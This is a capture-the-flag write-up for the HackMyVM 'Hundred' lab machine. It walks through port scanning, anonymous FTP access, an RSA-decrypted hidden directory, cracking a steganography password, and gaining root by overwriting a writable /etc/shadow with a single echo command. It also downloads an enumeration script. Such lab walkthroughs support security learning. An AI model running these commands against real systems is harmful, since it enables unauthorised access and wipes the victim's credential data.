---
title: "Hundred - HackMyVM"
summary: "Difficulty: Easy 🟢"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://hackmyvm.eu/machines/machine.php?vm=Hundred)


When starting the machine, we see the **IP** of the victim machine.

![01](/images/writeups/hundred/1.png)

I decided to use **NMAP** to scan for **open ports** and obtain information about the **services** and other details associated with them.

```bash
sudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.181
```

![02](/images/writeups/hundred/2.png)

```bash
nmap -sCV -p21,22,80 -n -Pn 192.168.18.181 -oN target
```

![03](/images/writeups/hundred/3.png)

We observed that **port 21** (**FTP**) is vulnerable to **anonymous login**, so I decided to log in because the scan indicated there were files of interest

![04](/images/writeups/hundred/4.png)

Now that we are inside, I decide to download the file ***users.txt*** using the **get** command.

```bash
get users.txth
```

And on my local machine, I check to see what's there, and it appears to be a **dictionary**. But at the bottom, we can notice a username (**hmv**).

![05](/images/writeups/hundred/5.png)

After downloading the **id_rsa** file, we discover that it’s actually a drawing of a rabbit.

![06](/images/writeups/hundred/6.png)
<h6>Rabbit Hole reference</h6>

And we observe that ***id_rsa.pem*** seems to be a private **id_rsa** key.

![07](/images/writeups/hundred/7.png)

I grant privileges to the **private key** and try to access, but it doesn't work.

![08](/images/writeups/hundred/8.png)

It seemed that the rabbit drawing was a hint that the **id_rsa** file was just a **rabbit hole**.

I decide to go through **port 80** (**HTTP**).

![09](/images/writeups/hundred/9.png)
<h6>Homepage</h6>

![10](/images/writeups/hundred/10.png)
<h6>Source code of the homepage</h6>

We can observe a value named '**key**' that contains some strange text. I notice that it's an '**.enc**' file. We can decode the file using the **RSA private key** and **OpenSSL**. 

We use the **private key** file and the downloaded file, and it generates a **directory**:

```bash
openssl pkeyutl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc -out key
```

```bash
cat key
```

![11](/images/writeups/hundred/11.png)

![12](/images/writeups/hundred/12.png)


As it says it's there, I decide to use Gobuster to search and see if there are any subdirectories or files within this directory.

![13](/images/writeups/hundred/13.png)
<h6>Directory and file enumeration with Gobuster</h6>

And we come across another **id_rsa**. So, I download it.

```bash
wget http://192.168.18.181/softyhackb4el7dshelldredd/id_rsa
```

![14](/images/writeups/hundred/14.png)

![15](/images/writeups/hundred/15.png)

As we can see, it appears to be a **private key**. Let's see if it works:

![16](/images/writeups/hundred/16.png)

Unfortunately, it is asking for a **password**.

For the next step, we will need to download the image from the webpage and use **steganography techniques** to extract information from the image.

```bash
wget http://192.168.18.181/logo.jpg
```

I decide to use [**Stegseek**](https://github.com/RickdeJager/stegseek) with the **dictionary** we obtained earlier from **port 21** (**FTP**).

```bash
stegseek logo.jpg users.txt
```

![17](/images/writeups/hundred/17.png)

![18](/images/writeups/hundred/18.png)

We obtain the **password** required by the **private key**, which allow us to access and log in as the user **hmv**.

![19](/images/writeups/hundred/19.png)

And we can obtain the user flag 🚩.

## Privilege escalation to root

There are only two users: hmv and root.

![20](/images/writeups/hundred/20.png)


After experimenting for a while and using tools like [**pspy**](https://github.com/DominicBreuker/pspy) and [**LinPeas**](https://github.com/peass-ng/PEASS-ng/tree/master) without success, I decided to run the [**lse.sh**](https://github.com/diego-treitos/linux-smart-enumeration) script, which is designed to gather relevant information about local **Linux system security** to assist with **privilege escalation**.

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
```

```bash
./lse.sh -l1
```

This last command is used to display information in more detail.

As a result, we see that the ***/etc/shadow*** file **can be edited**.

![21](/images/writeups/hundred/21.png)
<h6>Critical file can be edited: /etc/shadow</h6>

To change the **root password** in the ***/etc/shadow*** file, we will use the following commands:

```bash
openssl passwd
```

This is used to generate the **password in hash format**.

Since I can't edit the ***/etc/shadow*** file directly with a text editor like **nano**, we have to overwrite the entire file. Therefore, our only option is to run the following command:

```bash
echo root:e84V4zPcic2M2:18844:0:99999:7::: > /etc/shadow
```

> 🚨 IMPORTANT: This command is very dangerous because it completely overwrites the ***/etc/shadow*** file, **deleting all existing user password hashes and settings** except the line we add. This can lock out all other users and cause serious system access problems.

![22](/images/writeups/hundred/22.png)
<h6>We are root now</h6>

We log in as the **root** user using our **password**. Once we have **root** access, we retrieve the **root flag** and successfully finish hacking the machine.